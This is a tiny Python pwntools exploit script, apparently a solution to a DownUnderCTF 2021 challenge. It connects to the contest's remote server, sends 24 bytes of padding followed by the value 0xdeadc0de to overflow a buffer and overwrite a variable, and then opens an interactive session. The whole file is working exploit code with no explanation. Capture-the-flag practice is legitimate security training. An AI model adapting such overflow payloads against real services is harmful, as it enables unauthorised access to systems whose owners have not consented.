from pwn import *

p = remote('pwn-2021.duc.tf', 31916)
pad = "a" *24

payload = pad
payload += p64(0xdeadc0de)

p.sendlineafter("app?\n",payload)

p.interactive()
        
